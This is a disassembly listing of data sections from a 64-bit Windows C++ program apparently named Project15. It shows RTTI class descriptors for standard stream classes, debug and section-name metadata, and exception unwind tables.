; std::basic_stringstream<char, struct std::char_traits<char>, class std::allocator<char>>::`RTTI Class Hierarchy Descriptor'
??_R3?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 dd 0 ; signature
dd 3                    ; attributes
dd 10                   ; # of items in the array of base classes
dd rva ??_R2?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@8 ; reference to the array of base classes
align 20h
; std::_Iosb<int>::`RTTI Base Class Array'
??_R2?$_Iosb@H@std@@8 dd rva ??_R1A@?0A@EA@?$_Iosb@H@std@@8 ; reference to base class decription 1
align 10h
; std::ios_base::`RTTI Base Class Descriptor at (0, 0, 4, 64)'
??_R1A@A@3EA@ios_base@std@@8 dd rva ??_R0?AVios_base@std@@@8 ; reference to type description
dd 1                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd 0                    ; vftable displacement
dd 4                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3ios_base@std@@8 ; reference to class hierarchy descriptor
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::basic_ios<char, struct std::char_traits<char>>::`RTTI Base Class Descriptor at (0, -1, 0, 64)'
??_R1A@?0A@EA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 dd rva ??_R0?AV?$basic_ios@DU?$char_traits@D@std@@@std@@@8 ; reference to type description
dd 2                    ; # of sub elements within base class array
dd 0                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; reference to class hierarchy descriptor
align 20h
; std::_Iosb<int>::`RTTI Class Hierarchy Descriptor'
??_R3?$_Iosb@H@std@@8 dd 0 ; signature
dd 0                    ; attributes
dd 1                    ; # of items in the array of base classes
dd rva ??_R2?$_Iosb@H@std@@8 ; reference to the array of base classes
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; std::_Iosb<int>::`RTTI Base Class Descriptor at (8, -1, 0, 64)'
??_R17?0A@EA@?$_Iosb@H@std@@8 dd rva ??_R0?AV?$_Iosb@H@std@@@8 ; reference to type description
dd 0                    ; # of sub elements within base class array
dd 8                    ; member displacement
dd -1                   ; vftable displacement
dd 0                    ; displacement within vftable
dd 40h                  ; base class attributes
dd rva ??_R3?$_Iosb@H@std@@8 ; reference to class hierarchy descriptor
align 20h
; std::basic_ios<char, struct std::char_traits<char>>::`RTTI Base Class Array'
??_R2?$basic_ios@DU?$char_traits@D@std@@@std@@8 dd rva ??_R1A@?0A@EA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; reference to base class decription 1
dd rva ??_R1A@?0A@EA@ios_base@std@@8 ; reference to base class decription 2
dd rva ??_R17?0A@EA@?$_Iosb@H@std@@8 ; reference to base class decription 3
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
__volatile_metadata db  18h
db    0
db    0
db    0
db    3
db  80h
db    3
db  80h
db 0D4h
db  9Ch
db    0
db    0
db  24h ; $
db    0
db    0
db    0
db 0F8h
db  9Ch
db    0
db    0
db  18h
db    0
db    0
db    0
db  5Dh ; ]
db  66h ; f
db    0
db    0
db  6Ch ; l
db  66h ; f
db    0
db    0
db  7Eh ; ~
db  66h ; f
db    0
db    0
db  38h ; 8
db  68h ; h
db    0
db    0
db  48h ; H
db  6Dh ; m
db    0
db    0
db  57h ; W
db  6Dh ; m
db    0
db    0
db 0BAh
db  6Dh ; m
db    0
db    0
db  0Ah
db  6Eh ; n
db    0
db    0
db  51h ; Q
db  6Eh ; n
db    0
db    0
db 0A0h
db  62h ; b
db    0
db    0
db 0F0h
db  0Bh
db    0
db    0
db  50h ; P
db  6Fh ; o
db    0
db    0
db  68h ; h
db    2
db    0
db    0
db 0A0h
db  73h ; s
db    0
db    0
db  38h ; 8
db    0
db    0
db    0
; Debug information (IMAGE_DEBUG_TYPE_CODEVIEW)
asc_140009D10 db 'RSDS' ; CV signature
dd 4DF93627h            ; Data1 ; GUID
dw 9793h                ; Data2
dw 416Ch                ; Data3
db 86h, 1Eh, 85h, 0FAh, 76h, 17h, 0EFh, 77h; Data4
dd 13h                  ; Age
text "UTF-8", 'C:\Users\y\source\repos\' ; PdbFileName
text "UTF-8", 'Project15\Project15\x64\'
text "UTF-8", 'Release\Project15.pdb',0
align 10h
; Debug information (IMAGE_DEBUG_TYPE_VC_FEATURE)
unk_140009D70 db    0
db    0
db    0
db    0
db  27h ; '
db    0
db    0
db    0
db  27h ; '
db    0
db    0
db    0
db    1
db    0
db    0
db    0
db  26h ; &
db    0
db    0
db    0
; Debug information (IMAGE_DEBUG_TYPE_POGO)
aGctl db 'GCTL',0
db  10h
db    0
db    0
db 0E0h
db  61h ; a
db    0
db    0
db  2Eh ; .
db  74h ; t
db  65h ; e
db  78h ; x
db  74h ; t
db  24h ; $
db  6Dh ; m
db  6Eh ; n
db    0
db    0
db    0
db    0
db 0E0h
db  71h ; q
db    0
db    0
db  40h ; @
db    0
db    0
db    0
db  2Eh ; .
db  74h ; t
db  65h ; e
db  78h ; x
db  74h ; t
db  24h ; $
db  6Dh ; m
db  6Eh ; n
db  24h ; $
db  30h ; 0
db  30h ; 0
db    0
db  20h
db  72h ; r
db    0
db    0
db 0B8h
db    1
db    0
db    0
db  2Eh ; .
db  74h ; t
db  65h ; e
db  78h ; x
db  74h ; t
db  24h ; $
db  78h ; x
db    0
db    0
db  80h
db    0
db    0
db  20h
db    5
db    0
db    0
db  2Eh ; .
db  69h ; i
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  35h ; 5
db    0
db    0
db    0
db    0
db  20h
db  85h
db    0
db    0
db  38h ; 8
db    0
db    0
db    0
db  2Eh ; .
db  30h ; 0
db  30h ; 0
db  63h ; c
db  66h ; f
db  67h ; g
db    0
db    0
db  58h ; X
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  43h ; C
db  41h ; A
db    0
db    0
db    0
db    0
db  60h ; `
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  43h ; C
db  41h ; A
db  41h ; A
db    0
db    0
db    0
db  68h ; h
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  43h ; C
db  5Ah ; Z
db    0
db    0
db    0
db    0
db  70h ; p
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  49h ; I
db  41h ; A
db    0
db    0
db    0
db    0
db  78h ; x
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  49h ; I
db  41h ; A
db  41h ; A
db    0
db    0
db    0
db  80h
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  49h ; I
db  41h ; A
db  43h ; C
db    0
db    0
db    0
db  88h
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  49h ; I
db  5Ah ; Z
db    0
db    0
db    0
db    0
db  90h
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  50h ; P
db  41h ; A
db    0
db    0
db    0
db    0
db  98h
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  50h ; P
db  5Ah ; Z
db    0
db    0
db    0
db    0
db 0A0h
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  54h ; T
db  41h ; A
db    0
db    0
db    0
db    0
db 0A8h
db  85h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  43h ; C
db  52h ; R
db  54h ; T
db  24h ; $
db  58h ; X
db  54h ; T
db  5Ah ; Z
db    0
db    0
db    0
db    0
db 0B0h
db  85h
db    0
db    0
db  50h ; P
db  10h
db    0
db    0
db  2Eh ; .
db  72h ; r
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db    0
db    0
db    0
db  96h
db    0
db    0
db 0BCh
db    6
db    0
db    0
db  2Eh ; .
db  72h ; r
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  72h ; r
db    0
db    0
db    0
db    0
db 0BCh
db  9Ch
db    0
db    0
db  54h ; T
db    0
db    0
db    0
db  2Eh ; .
db  72h ; r
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  76h ; v
db  6Fh ; o
db  6Ch ; l
db  74h ; t
db  6Dh ; m
db  64h ; d
db    0
db    0
db    0
db  10h
db  9Dh
db    0
db    0
db  48h ; H
db    3
db    0
db    0
db  2Eh ; .
db  72h ; r
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  7Ah ; z
db  7Ah ; z
db  7Ah ; z
db  64h ; d
db  62h ; b
db  67h ; g
db    0
db    0
db    0
db  58h ; X
db 0A0h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  72h ; r
db  74h ; t
db  63h ; c
db  24h ; $
db  49h ; I
db  41h ; A
db  41h ; A
db    0
db    0
db    0
db    0
db  60h ; `
db 0A0h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  72h ; r
db  74h ; t
db  63h ; c
db  24h ; $
db  49h ; I
db  5Ah ; Z
db  5Ah ; Z
db    0
db    0
db    0
db    0
db  68h ; h
db 0A0h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  72h ; r
db  74h ; t
db  63h ; c
db  24h ; $
db  54h ; T
db  41h ; A
db  41h ; A
db    0
db    0
db    0
db    0
db  70h ; p
db 0A0h
db    0
db    0
db    8
db    0
db    0
db    0
db  2Eh ; .
db  72h ; r
db  74h ; t
db  63h ; c
db  24h ; $
db  54h ; T
db  5Ah ; Z
db  5Ah ; Z
db    0
db    0
db    0
db    0
db  78h ; x
db 0A0h
db    0
db    0
db 0F8h
db    6
db    0
db    0
db  2Eh ; .
db  78h ; x
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db    0
db    0
db  70h ; p
db 0A7h
db    0
db    0
db 0ECh
db    0
db    0
db    0
db  2Eh ; .
db  78h ; x
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  78h ; x
db    0
db    0
db    0
db    0
db  5Ch ; \
db 0A8h
db    0
db    0
db  18h
db    1
db    0
db    0
db  2Eh ; .
db  69h ; i
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  32h ; 2
db    0
db    0
db    0
db    0
db  74h ; t
db 0A9h
db    0
db    0
db  14h
db    0
db    0
db    0
db  2Eh ; .
db  69h ; i
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  33h ; 3
db    0
db    0
db    0
db    0
db  88h
db 0A9h
db    0
db    0
db  20h
db    5
db    0
db    0
db  2Eh ; .
db  69h ; i
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  34h ; 4
db    0
db    0
db    0
db    0
db 0A8h
db 0AEh
db    0
db    0
db  32h ; 2
db  10h
db    0
db    0
db  2Eh ; .
db  69h ; i
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  36h ; 6
db    0
db    0
db    0
db    0
db    0
db 0C0h
db    0
db    0
db  50h ; P
db    1
db    0
db    0
db  2Eh ; .
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db    0
db    0
db    0
db  50h ; P
db 0C1h
db    0
db    0
db  80h
db    0
db    0
db    0
db  2Eh ; .
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  72h ; r
db    0
db 0D0h
db 0C1h
db    0
db    0
db 0A0h
db    2
db    0
db    0
db  2Eh ; .
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db  24h ; $
db  72h ; r
db  73h ; s
db    0
db    0
db    0
db    0
db  70h ; p
db 0C4h
db    0
db    0
db  10h
db    1
db    0
db    0
db  2Eh ; .
db  62h ; b
db  73h ; s
db  73h ; s
db    0
db    0
db    0
db    0
db    0
db 0D0h
db    0
db    0
db 0B0h
db    4
db    0
db    0
db  2Eh ; .
db  70h ; p
db  64h ; d
db  61h ; a
db  74h ; t
db  61h ; a
db    0
db    0
db    0
db 0E0h
db    0
db    0
db  60h ; `
db    0
db    0
db    0
db  2Eh ; .
db  72h ; r
db  73h ; s
db  72h ; r
db  63h ; c
db  24h ; $
db  30h ; 0
db  31h ; 1
db    0
db    0
db    0
db    0
db  60h ; `
db 0E0h
db    0
db    0
db  88h
db    1
db    0
db    0
db  2Eh ; .
db  72h ; r
db  73h ; s
db  72h ; r
db  63h ; c
db  24h ; $
db  30h ; 0
db  32h ; 2
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_14000A060 db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_14000A070 db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
stru_14000A078 UNWIND_INFO_HDR <1, 12h, 5, 0>
UNWIND_CODE <12h, 62h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <0Eh, 70h>  ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Dh, 60h>  ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Ch, 50h>  ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Bh, 30h>  ; UWOP_PUSH_NONVOL
align 4
stru_14000A088 UNWIND_INFO_HDR <1, 6, 2, 0>
UNWIND_CODE <6, 32h>    ; UWOP_ALLOC_SMALL
UNWIND_CODE <2, 30h>    ; UWOP_PUSH_NONVOL
stru_14000A090 UNWIND_INFO_HDR <1, 0Ah, 4, 0>
UNWIND_CODE <0Ah, 34h>  ; UWOP_SAVE_NONVOL
dw 6
UNWIND_CODE <0Ah, 32h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <6, 70h>    ; UWOP_PUSH_NONVOL
stru_14000A09C UNWIND_INFO_HDR <1, 4, 1, 0>
UNWIND_CODE <4, 82h>    ; UWOP_ALLOC_SMALL
align 4
stru_14000A0A4 UNWIND_INFO_HDR <1, 4, 1, 0>
UNWIND_CODE <4, 42h>    ; UWOP_ALLOC_SMALL
align 4
stru_14000A0AC UNWIND_INFO_HDR <1, 5, 2, 0>
UNWIND_CODE <5, 34h>    ; UWOP_SAVE_NONVOL
dw 1
stru_14000A0B4 UNWIND_INFO_HDR <19h, 2Eh, 9, 0>
UNWIND_CODE <1Dh, 64h>  ; UWOP_SAVE_NONVOL
dw 3Ah
UNWIND_CODE <1Dh, 34h>  ; UWOP_SAVE_NONVOL
dw 39h
UNWIND_CODE <1Dh, 1>    ; UWOP_ALLOC_LARGE
dw 34h
UNWIND_CODE <0Eh, 0E0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Ch, 70h>  ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Bh, 50h>  ; UWOP_PUSH_NONVOL
align 4
dd rva sub_140007150
dd rva unk_14000A0D8
db  92h
db    1
db    0
db    0
unk_14000A0D8 db  28h ; (
db 0E1h
db 0A0h
db    0
db    0
db 0FEh
db 0A0h
db    0
db    0
db  0Ah
db  0Eh
db  20h
db  72h ; r
db    0
db    0
db  2Eh ; .
db  51h ; Q
db  72h ; r
db    0
db    0
db  5Ah ; Z
db  50h ; P
db  1Bh
db    0
db    0
db  41h ; A
db    2
db  3Eh ; >
db  6Fh ; o
db  72h ; r
db    0
db    0
db  62h ; b
db 0E0h
db  53h ; S
db    0
db    0
db 0E0h
db  10h
db 0F4h
db    0
db  34h ; 4
db    2
db  62h ; b
db    4
db  46h ; F
db    6
db  55h ; U
db    4
db    8
db  3Dh ; =
db    2
db  0Ah
db  31h ; 1
db    2
db    6
db  4Dh ; M
db    2
db    0
db    0
stru_14000A114 UNWIND_INFO_HDR <1, 6, 2, 0>
UNWIND_CODE <6, 32h>    ; UWOP_ALLOC_SMALL
UNWIND_CODE <2, 50h>    ; UWOP_PUSH_NONVOL
stru_14000A11C UNWIND_INFO_HDR <19h, 3Fh, 0Ah, 0>
UNWIND_CODE <3Fh, 74h>  ; UWOP_SAVE_NONVOL
dw 0D2h
UNWIND_CODE <2Fh, 0E4h> ; UWOP_SAVE_NONVOL
dw 0CEh
UNWIND_CODE <2Bh, 64h>  ; UWOP_SAVE_NONVOL
dw 0D1h
UNWIND_CODE <20h, 34h>  ; UWOP_SAVE_NONVOL
dw 0D0h
UNWIND_CODE <0Ah, 1>    ; UWOP_ALLOC_LARGE
dw 0CFh
dd rva __GSHandlerCheck
dd 660h
stru_14000A13C UNWIND_INFO_HDR <1, 6, 2, 0>
UNWIND_CODE <6, 52h>    ; UWOP_ALLOC_SMALL
UNWIND_CODE <2, 30h>    ; UWOP_PUSH_NONVOL
stru_14000A144 UNWIND_INFO_HDR <19h, 5Dh, 19h, 0>
UNWIND_CODE <4Fh, 0F8h> ; UWOP_SAVE_XMM128
dw 15h
UNWIND_CODE <47h, 0E8h> ; UWOP_SAVE_XMM128
dw 16h
UNWIND_CODE <3Fh, 0D8h> ; UWOP_SAVE_XMM128
dw 17h
UNWIND_CODE <37h, 0C8h> ; UWOP_SAVE_XMM128
dw 18h
UNWIND_CODE <32h, 0B8h> ; UWOP_SAVE_XMM128
dw 19h
UNWIND_CODE <2Dh, 0A8h> ; UWOP_SAVE_XMM128
dw 1Ah
UNWIND_CODE <28h, 98h>  ; UWOP_SAVE_XMM128
dw 1Bh
UNWIND_CODE <23h, 88h>  ; UWOP_SAVE_XMM128
dw 1Ch
UNWIND_CODE <1Eh, 78h>  ; UWOP_SAVE_XMM128
dw 1Dh
UNWIND_CODE <1Ah, 68h>  ; UWOP_SAVE_XMM128
dw 1Eh
UNWIND_CODE <16h, 34h>  ; UWOP_SAVE_NONVOL
dw 40h
UNWIND_CODE <16h, 1>    ; UWOP_ALLOC_LARGE
dw 3Eh
UNWIND_CODE <8, 50h>    ; UWOP_PUSH_NONVOL
align 4
dd rva __GSHandlerCheck
dd 140h
stru_14000A184 UNWIND_INFO_HDR <19h, 22h, 3, 0>
UNWIND_CODE <11h, 1>    ; UWOP_ALLOC_LARGE
dw 1B0h
UNWIND_CODE <2, 50h>    ; UWOP_PUSH_NONVOL
align 4
dd rva __GSHandlerCheck
dd 0D70h
stru_14000A198 UNWIND_INFO_HDR <21h, 8, 2, 0>
UNWIND_CODE <8, 34h>    ; UWOP_SAVE_NONVOL
dw 1B2h
RUNTIME_FUNCTION <rva sub_1400021C0, \
                  rva loc_140002237, \
                  rva stru_14000A184>
stru_14000A1AC UNWIND_INFO_HDR <21h, 8, 2, 0>
UNWIND_CODE <8, 74h>    ; UWOP_SAVE_NONVOL
dw 1B3h
RUNTIME_FUNCTION <rva loc_140002237, \
                  rva loc_1400023C0, \
                  rva stru_14000A198>
stru_14000A1C0 UNWIND_INFO_HDR <21h, 0, 0, 0>
RUNTIME_FUNCTION <rva loc_140002237, \
                  rva loc_1400023C0, \
                  rva stru_14000A198>
stru_14000A1D0 UNWIND_INFO_HDR <21h, 0, 0, 0>
RUNTIME_FUNCTION <rva sub_1400021C0, \
                  rva loc_140002237, \
                  rva stru_14000A184>
stru_14000A1E0 UNWIND_INFO_HDR <19h, 19h, 2, 0>
UNWIND_CODE <7, 1>      ; UWOP_ALLOC_LARGE
dw 0CDh
dd rva __GSHandlerCheck
dd 650h
stru_14000A1F0 UNWIND_INFO_HDR <11h, 0Dh, 7, 0>
UNWIND_CODE <0Dh, 82h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <9, 0F0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <7, 0E0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <5, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <4, 60h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 50h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 30h>    ; UWOP_PUSH_NONVOL
align 4
dd rva __CxxFrameHandler4
dd rva byte_14000A20C
byte_14000A20C db 28h   ; FuncInfo4
dd rva byte_14000A215
dd rva byte_14000A21C
byte_14000A215 db 2     ; num unwind entries: 1
db 0Ah                  ; funclet type: 1
dd rva sub_1400053E0    ; funclet
db 40h                  ; frame offset of object ptr to be destructed
byte_14000A21C db 4     ; num_ip2state entries: 2
db 75h, 2               ; ea 0x1400029CD
db 0                    ; state -1
db 0BAh                 ; ea 0x140002A2A
db 2                    ; state 0
db    0
db    0
stru_14000A224 UNWIND_INFO_HDR <19h, 1Eh, 7, 0>
UNWIND_CODE <10h, 0A2h> ; UWOP_ALLOC_SMALL
UNWIND_CODE <9, 0F0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <7, 0E0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <5, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <4, 60h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 30h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 50h>    ; UWOP_PUSH_NONVOL
align 4
dd rva sub_140007150
dd rva unk_14000A244
db  4Ah ; J
db    0
db    0
db    0
unk_14000A244 db  28h ; (
db  15h
db 0A2h
db    0
db    0
db  4Dh ; M
db 0A2h
db    0
db    0
db  0Eh
db 0BDh
db    3
db    0
db  7Eh ; ~
db    2
db  84h
db    0
db  6Ch ; l
db    2
db  96h
db    0
db  94h
db    2
db  88h
db    0
db    0
db    0
db    0
stru_14000A260 UNWIND_INFO_HDR <19h, 19h, 4, 0>
UNWIND_CODE <0Ah, 64h>  ; UWOP_SAVE_NONVOL
dw 9
UNWIND_CODE <0Ah, 52h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <6, 70h>    ; UWOP_PUSH_NONVOL
dd rva __GSHandlerCheck
dd 28h
stru_14000A274 UNWIND_INFO_HDR <21h, 5, 2, 0>
UNWIND_CODE <5, 34h>    ; UWOP_SAVE_NONVOL
dw 8
RUNTIME_FUNCTION <rva sub_140002D30, \
                  rva loc_140002D62, \
                  rva stru_14000A260>
stru_14000A288 UNWIND_INFO_HDR <21h, 0, 0, 0>
RUNTIME_FUNCTION <rva sub_140002D30, \
                  rva loc_140002D62, \
                  rva stru_14000A260>
stru_14000A298 UNWIND_INFO_HDR <21h, 0, 2, 0>
UNWIND_CODE <0, 34h>    ; UWOP_SAVE_NONVOL
dw 8
RUNTIME_FUNCTION <rva sub_140002D30, \
                  rva loc_140002D62, \
                  rva stru_14000A260>
stru_14000A2AC UNWIND_INFO_HDR <19h, 15h, 2, 0>
UNWIND_CODE <6, 0B2h>   ; UWOP_ALLOC_SMALL
UNWIND_CODE <2, 30h>    ; UWOP_PUSH_NONVOL
dd rva __GSHandlerCheck
dd 50h
stru_14000A2BC UNWIND_INFO_HDR <19h, 2Dh, 0Ah, 0>
UNWIND_CODE <1Ch, 1>    ; UWOP_ALLOC_LARGE
dw 0E5h
UNWIND_CODE <0Dh, 0F0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Bh, 0E0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <9, 0D0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <7, 0C0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <5, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <4, 60h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 30h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 50h>    ; UWOP_PUSH_NONVOL
dd rva sub_140007150
dd rva unk_14000A2E0
db  12h
db    7
db    0
db    0
unk_14000A2E0 db  28h ; (
db 0E9h
db 0A2h
db    0
db    0
db 0FDh
db 0A2h
db    0
db    0
db    6
db  0Ah
db 0E0h
db  53h ; S
db    0
db    0
db  21h ; !
db    2
db  3Ah ; :
db 0E0h
db  53h ; S
db    0
db    0
db  90h
db  32h ; 2
db 0E0h
db  53h ; S
db    0
db    0
db 0D0h
db    8
db  99h
db  0Ch
db    0
db  91h
db    2
db    2
db  9Dh
db    2
db    4
db  8Eh
db    6
db    0
db    0
db    0
stru_14000A30C UNWIND_INFO_HDR <19h, 2Dh, 0Ah, 0>
UNWIND_CODE <1Ch, 1>    ; UWOP_ALLOC_LARGE
dw 0EFh
UNWIND_CODE <0Dh, 0F0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Bh, 0E0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <9, 0D0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <7, 0C0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <5, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <4, 60h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 30h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 50h>    ; UWOP_PUSH_NONVOL
dd rva sub_140007150
dd rva unk_14000A330
db  62h ; b
db    7
db    0
db    0
unk_14000A330 db  28h ; (
db  39h ; 9
db 0A3h
db    0
db    0
db  40h ; @
db 0A3h
db    0
db    0
db    2
db  0Ah
db 0E0h
db  53h ; S
db    0
db    0
db 0A0h
db    6
db 0E1h
db    8
db    0
db  8Ah
db    2
db 0C4h
db    0
stru_14000A348 UNWIND_INFO_HDR <19h, 1Fh, 5, 0>
UNWIND_CODE <0Dh, 34h>  ; UWOP_SAVE_NONVOL
dw 2Ah
UNWIND_CODE <0Dh, 1>    ; UWOP_ALLOC_LARGE
dw 26h
UNWIND_CODE <6, 70h>    ; UWOP_PUSH_NONVOL
align 4
dd rva __GSHandlerCheck
dd 120h
stru_14000A360 UNWIND_INFO_HDR <19h, 2Dh, 0Ah, 0>
UNWIND_CODE <1Ch, 1>    ; UWOP_ALLOC_LARGE
dw 175h
UNWIND_CODE <0Dh, 0F0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Bh, 0E0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <9, 0D0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <7, 0C0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <5, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <4, 60h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 30h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 50h>    ; UWOP_PUSH_NONVOL
dd rva sub_140007150
dd rva unk_14000A384
db  92h
db  0Bh
db    0
db    0
unk_14000A384 db  28h ; (
db  8Dh
db 0A3h
db    0
db    0
db  94h
db 0A3h
db    0
db    0
db    2
db  0Ah
db 0E0h
db  53h ; S
db    0
db    0
db  80h
db    6
db  9Dh
db  15h
db    0
db 0C9h
db  1Eh
db    2
db  16h
db    0
db    0
db    0
db    0
stru_14000A3A0 UNWIND_INFO_HDR <19h, 19h, 4, 0>
UNWIND_CODE <0Ah, 34h>  ; UWOP_SAVE_NONVOL
dw 0Dh
UNWIND_CODE <0Ah, 92h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <6, 70h>    ; UWOP_PUSH_NONVOL
dd rva sub_140007150
dd rva unk_14000A3B8
db  4Ah ; J
db    0
db    0
db    0
unk_14000A3B8 db  28h ; (
db  15h
db 0A2h
db    0
db    0
db 0C1h
db 0A3h
db    0
db    0
db    6
db 0D5h
db    2
db    0
db 0A0h
db    2
db 0AEh
db    0
db    0
db    0
db    0
stru_14000A3CC UNWIND_INFO_HDR <1, 4, 1, 0>
UNWIND_CODE <4, 62h>    ; UWOP_ALLOC_SMALL
align 4
stru_14000A3D4 UNWIND_INFO_HDR <1, 0Ch, 4, 0>
UNWIND_CODE <0Ch, 34h>  ; UWOP_SAVE_NONVOL
dw 0Eh
UNWIND_CODE <0Ch, 0B2h> ; UWOP_ALLOC_SMALL
UNWIND_CODE <8, 70h>    ; UWOP_PUSH_NONVOL
stru_14000A3E0 UNWIND_INFO_HDR <19h, 27h, 7, 0>
UNWIND_CODE <16h, 1>    ; UWOP_ALLOC_LARGE
dw 0E2h
UNWIND_CODE <7, 0E0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <5, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <4, 60h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 30h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 50h>    ; UWOP_PUSH_NONVOL
align 4
dd rva sub_140007150
dd rva unk_14000A400
db    2
db    7
db    0
db    0
unk_14000A400 db  28h ; (
db  8Dh
db 0A3h
db    0
db    0
db    9
db 0A4h
db    0
db    0
db    6
db  19h
db  0Ah
db    0
db 0F5h
db    8
db    2
db  16h
db    0
db    0
db    0
stru_14000A414 UNWIND_INFO_HDR <19h, 18h, 4, 0>
UNWIND_CODE <9, 92h>    ; UWOP_ALLOC_SMALL
UNWIND_CODE <5, 0E0h>   ; UWOP_PUSH_NONVOL
